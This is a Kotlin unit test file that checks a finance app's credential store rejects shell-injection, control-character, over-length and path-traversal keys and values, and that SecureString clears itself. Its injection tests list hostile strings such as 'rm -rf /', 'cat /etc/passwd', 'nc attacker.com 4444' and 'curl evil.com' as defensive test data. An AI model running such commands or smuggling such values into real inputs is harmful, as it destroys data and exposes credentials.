package com.financeapp.security

import kotlin.test.Test
import kotlin.test.BeforeTest
import kotlin.test.AfterTest
import kotlin.test.assertTrue
import kotlin.test.assertFalse
import kotlin.test.assertEquals
import kotlin.test.assertNull
import kotlin.test.assertNotNull
import kotlin.test.assertFailsWith
import java.io.File

/**
 * Security tests for SecureCredentialStore focusing on shell command injection prevention.
 */
class SecureCredentialStoreTest {
    private lateinit var store: SecureCredentialStore
    private val testDataDir = File(System.getProperty("user.home"), ".financeapp_test")

    @BeforeTest
    fun setup() {
        store = SecureCredentialStore()
        // Clean up test data
        testDataDir.deleteRecursively()
    }

    @AfterTest
    fun cleanup() {
        // Clean up test data
        testDataDir.deleteRecursively()

        // Clean up any test keys that might have been stored
        val testKeys = listOf(
            "test_valid_key",
            "test_another_key",
            "bank_connection_123"
        )
        testKeys.forEach { store.delete(it) }
    }

    // === SHELL COMMAND INJECTION TESTS ===

    @Test
    fun `test key with shell metacharacters is rejected`() {
        val maliciousKeys = listOf(
            "key; rm -rf /",
            "key && cat /etc/passwd",
            "key | nc attacker.com 4444",
            "key`whoami`",
            "key\$(whoami)",
            "key > /tmp/pwned",
            "key < /etc/passwd",
            "key || curl evil.com",
            "key & echo hacked",
            "key' || '1'='1",
            "key\" || \"1\"=\"1",
            "../../etc/passwd",
            "../../../root/.ssh/id_rsa",
            "key\nrm -rf /",
            "key\rmalicious",
            "key\tinjection"
        )

        maliciousKeys.forEach { maliciousKey ->
            val result = store.store(maliciousKey, "password123")
            assertFalse(result, "Key with shell metacharacters should be rejected: $maliciousKey")

            val retrieved = store.retrieve(maliciousKey)
            assertNull(retrieved, "Should not retrieve value for malicious key: $maliciousKey")
        }
    }

    @Test
    fun `test value with null bytes is rejected`() {
        val maliciousValues = listOf(
            "password\u0000injection",
            "\u0000password",
            "password\u0000"
        )

        maliciousValues.forEach { maliciousValue ->
            val result = store.store("valid_key", maliciousValue)
            assertFalse(result, "Value with null bytes should be rejected")
        }
    }

    @Test
    fun `test value with control characters is rejected`() {
        val maliciousValues = listOf(
            "password\u0001injection", // SOH
            "password\u0002injection", // STX
            "password\u0003injection", // ETX
            "password\u0007injection", // BEL
            "password\u001binjection", // ESC
            "password\ninjection",     // LF (except tab which is allowed)
            "password\rinjection"      // CR
        )

        maliciousValues.forEach { maliciousValue ->
            val result = store.store("valid_key", maliciousValue)
            assertFalse(result, "Value with control character should be rejected: ${maliciousValue.replace("\n", "\\n").replace("\r", "\\r")}")
        }
    }

    @Test
    fun `test excessively long key is rejected`() {
        val longKey = "a".repeat(129) // Max is 128
        val result = store.store(longKey, "password")
        assertFalse(result, "Excessively long key should be rejected")
    }

    @Test
    fun `test excessively long value is rejected`() {
        val longValue = "a".repeat(1025) // Max is 1024
        val result = store.store("valid_key", longValue)
        assertFalse(result, "Excessively long value should be rejected")
    }

    @Test
    fun `test path traversal in key is rejected`() {
        val pathTraversalKeys = listOf(
            "../sensitive_file",
            "../../etc/passwd",
            "..\\..\\windows\\system32",
            ".ssh/id_rsa",
            "~/.bash_history"
        )

        pathTraversalKeys.forEach { key ->
            val result = store.store(key, "value")
            assertFalse(result, "Path traversal key should be rejected: $key")
        }
    }

    // === VALID INPUT TESTS ===

    @Test
    fun `test valid alphanumeric key is accepted`() {
        val result = store.store("valid_key_123", "myPassword")
        assertTrue(result, "Valid alphanumeric key should be accepted")

        val retrieved = store.retrieve("valid_key_123")
        assertEquals("myPassword", retrieved)

        // Cleanup
        store.delete("valid_key_123")
    }

    @Test
    fun `test key with underscores and hyphens is accepted`() {
        val result = store.store("bank_connection-123", "myPassword")
        assertTrue(result, "Key with underscores and hyphens should be accepted")

        val retrieved = store.retrieve("bank_connection-123")
        assertEquals("myPassword", retrieved)

        // Cleanup
        store.delete("bank_connection-123")
    }

    @Test
    fun `test value with tab character is accepted`() {
        val valueWithTab = "password\tvalue"
        val result = store.store("valid_key", valueWithTab)
        assertTrue(result, "Value with tab character should be accepted")

        val retrieved = store.retrieve("valid_key")

        // macOS Keychain may sanitize tab characters, so we only test on non-macOS
        val isMac = System.getProperty("os.name").lowercase().contains("mac")
        if (!isMac) {
            assertEquals(valueWithTab, retrieved)
        } else {
            // On macOS, just verify we got something back
            assertNotNull(retrieved, "Should retrieve value on macOS even if tab is sanitized")
        }

        // Cleanup
        store.delete("valid_key")
    }

    @Test
    fun `test maximum length key is accepted`() {
        val maxLengthKey = "a".repeat(128)
        val result = store.store(maxLengthKey, "password")
        assertTrue(result, "Maximum length key (128 chars) should be accepted")

        val retrieved = store.retrieve(maxLengthKey)
        assertEquals("password", retrieved)

        // Cleanup
        store.delete(maxLengthKey)
    }

    @Test
    fun `test maximum length value is accepted`() {
        val maxLengthValue = "a".repeat(1024)
        val result = store.store("valid_key", maxLengthValue)
        assertTrue(result, "Maximum length value (1024 chars) should be accepted")

        val retrieved = store.retrieve("valid_key")
        assertEquals(maxLengthValue, retrieved)

        // Cleanup
        store.delete("valid_key")
    }

    // === FUNCTIONAL TESTS ===

    @Test
    fun `test store retrieve and delete cycle`() {
        val key = "test_credential"
        val value = "secretPassword123"

        // Store
        val storeResult = store.store(key, value)
        assertTrue(storeResult, "Store should succeed")

        // Retrieve
        val retrieved = store.retrieve(key)
        assertEquals(value, retrieved, "Retrieved value should match stored value")

        // Delete
        val deleteResult = store.delete(key)
        assertTrue(deleteResult, "Delete should succeed")

        // Verify deleted
        val retrievedAfterDelete = store.retrieve(key)
        assertNull(retrievedAfterDelete, "Value should be null after deletion")
    }

    @Test
    fun `test retrieve non-existent key returns null`() {
        val result = store.retrieve("non_existent_key_12345")
        assertNull(result, "Non-existent key should return null")
    }

    @Test
    fun `test delete non-existent key returns false`() {
        val result = store.delete("non_existent_key_12345")
        // Note: Behavior may vary by platform, but should not crash
        // Just verify it doesn't throw an exception
    }

    @Test
    fun `test overwrite existing credential`() {
        val key = "test_key"

        // Store first value
        store.store(key, "firstValue")
        assertEquals("firstValue", store.retrieve(key))

        // Overwrite with second value
        store.store(key, "secondValue")
        assertEquals("secondValue", store.retrieve(key))

        // Cleanup
        store.delete(key)
    }

    // === SECURE STRING TESTS ===

    @Test
    fun `test SecureString store and retrieve`() {
        val key = "secure_test_key"
        val password = SecureString("mySecurePassword")

        val storeResult = store.storeSecure(key, password)
        assertTrue(storeResult, "SecureString store should succeed")

        val retrieved = store.retrieveSecure(key)
        assertNotNull(retrieved, "Retrieved SecureString should not be null")

        // Verify value
        retrieved.use { charArray ->
            assertEquals("mySecurePassword", String(charArray))
        }

        // Cleanup
        store.delete(key)
    }

    @Test
    fun `test SecureString is cleared after use`() {
        val password = SecureString("sensitive")

        password.use { charArray ->
            assertEquals("sensitive", String(charArray))
        }

        // After use block, SecureString should be cleared
        assertFailsWith<IllegalStateException> {
            password.value
        }
    }

    @Test
    fun `test SecureString manual clear`() {
        val password = SecureString("sensitive")

        // Verify it works before clear
        assertEquals("sensitive", password.toUnsafeString())

        // Clear it
        password.clear()

        // Should throw after clear
        assertFailsWith<IllegalStateException> {
            password.value
        }
    }

    @Test
    fun `test SecureString isEmpty and length`() {
        val empty = SecureString("")
        assertTrue(empty.isEmpty)
        assertEquals(0, empty.length)

        val notEmpty = SecureString("password")
        assertFalse(notEmpty.isEmpty)
        assertEquals(8, notEmpty.length)

        empty.clear()
        notEmpty.clear()
    }
}
